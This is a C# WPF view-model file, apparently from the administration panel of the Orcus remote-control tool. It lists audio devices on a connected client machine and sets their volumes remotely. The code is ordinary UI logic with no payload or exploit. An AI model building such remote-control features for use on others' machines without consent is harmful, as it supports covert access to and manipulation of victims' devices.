using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Linq;
using System.Windows;
using System.Windows.Data;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.AudioVolumeControl;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.AudioVolumeControl;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class AudioVolumeControlViewModel : CommandView
    {
        private ObservableCollection<AudioDevice> _audioDevices;
        private AudioVolumeControlCommand _audioVolumeControlCommand;
        private ICollectionView _placbackDevicesCollectionView;
        private float _playbackDeviceMasterVolume;
        private float _recordingDeviceMasterVolume;
        private ICollectionView _recordingDevicesCollectionView;
        private RelayCommand _refreshDevicesCommand;
        private AudioDevice _selectedPlaybackDevice;
        private AudioDevice _selectedRecordingDevice;

        public ObservableCollection<AudioDevice> AudioDevices
        {
            get { return _audioDevices; }
            set { SetProperty(value, ref _audioDevices); }
        }

        public ICollectionView PlaybackDevicesCollectionView
        {
            get { return _placbackDevicesCollectionView; }
            set { SetProperty(value, ref _placbackDevicesCollectionView); }
        }

        public ICollectionView RecordingDevicesCollectionView
        {
            get { return _recordingDevicesCollectionView; }
            set { SetProperty(value, ref _recordingDevicesCollectionView); }
        }

        public override string Name { get; } = (string) Application.Current.Resources["VolumeControl"];
        public override Category Category { get; } = Category.System;

        public AudioDevice SelectedPlaybackDevice
        {
            get { return _selectedPlaybackDevice; }
            set
            {
                if (SetProperty(value, ref _selectedPlaybackDevice) && value != null)
                {
                    _playbackDeviceMasterVolume = value.CurrentVolume;
                    OnPropertyChanged(nameof(PlaybackDeviceMasterVolume));
                }
            }
        }

        public AudioDevice SelectedRecordingDevice
        {
            get { return _selectedRecordingDevice; }
            set
            {
                if (SetProperty(value, ref _selectedRecordingDevice) & value != null)
                {
                    _recordingDeviceMasterVolume = value.CurrentVolume;
                    OnPropertyChanged(nameof(RecordingDeviceMasterVolume));
                }
            }
        }

        public float PlaybackDeviceMasterVolume
        {
            get { return _playbackDeviceMasterVolume; }
            set
            {
                if (SetProperty(value, ref _playbackDeviceMasterVolume))
                {
                    _audioVolumeControlCommand.SetMasterVolume(SelectedPlaybackDevice, value);
                    SelectedPlaybackDevice.CurrentVolume = value;
                }
            }
        }

        public float RecordingDeviceMasterVolume
        {
            get { return _recordingDeviceMasterVolume; }
            set
            {
                if (SetProperty(value, ref _recordingDeviceMasterVolume))
                {
                    _audioVolumeControlCommand.SetMasterVolume(SelectedRecordingDevice, value);
                    SelectedRecordingDevice.CurrentVolume = value;
                }
            }
        }

        public RelayCommand RefreshDevicesCommand
        {
            get
            {
                return _refreshDevicesCommand ??
                       (_refreshDevicesCommand =
                           new RelayCommand(parameter => { _audioVolumeControlCommand.GetDevices(); }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _audioVolumeControlCommand = clientController.Commander.GetCommand<AudioVolumeControlCommand>();
            _audioVolumeControlCommand.DevicesReceived += AudioVolumeControlCommandOnDevicesReceived;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/Volume_16x.png", UriKind.Absolute));
        }

        public void SetSelectedPlaybackDeviceChannelVolume(int channelIndex, float volume)
        {
            _audioVolumeControlCommand.SetChannelVolume(SelectedPlaybackDevice, channelIndex, volume);
        }

        public void SetSelectedRecordingDeviceChannelVolume(int channelIndex, float volume)
        {
            _audioVolumeControlCommand.SetChannelVolume(SelectedRecordingDevice, channelIndex, volume);
        }

        public override void LoadView(bool loadData)
        {
            _audioVolumeControlCommand.GetDevices();
        }

        private void AudioVolumeControlCommandOnDevicesReceived(object sender, List<AudioDevice> audioDevices)
        {
            SelectedPlaybackDevice = null;
            SelectedRecordingDevice = null;

            AudioDevices = new ObservableCollection<AudioDevice>(audioDevices);

            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                RecordingDevicesCollectionView = new CollectionViewSource {Source = AudioDevices}.View;
                PlaybackDevicesCollectionView = new CollectionViewSource {Source = AudioDevices}.View;

                RecordingDevicesCollectionView.Filter += RecordingDevicesFilter;
                PlaybackDevicesCollectionView.Filter += PlaybackDevicesFilter;

                SelectedPlaybackDevice =
                    AudioDevices.FirstOrDefault(x => x.IsDefault && x.AudioEndpointType == AudioEndpointType.Render) ??
                    AudioDevices.FirstOrDefault(x => x.AudioEndpointType == AudioEndpointType.Render);

                SelectedRecordingDevice =
                    AudioDevices.FirstOrDefault(x => x.IsDefault && x.AudioEndpointType == AudioEndpointType.Capture) ??
                    AudioDevices.FirstOrDefault(x => x.AudioEndpointType == AudioEndpointType.Capture);
            }));
        }

        private static bool RecordingDevicesFilter(object o)
        {
            var audioDevice = o as AudioDevice;
            return audioDevice != null && audioDevice.AudioEndpointType == AudioEndpointType.Capture;
        }

        private static bool PlaybackDevicesFilter(object o)
        {
            var audioDevice = o as AudioDevice;
            return audioDevice != null && audioDevice.AudioEndpointType == AudioEndpointType.Render;
        }
    }
}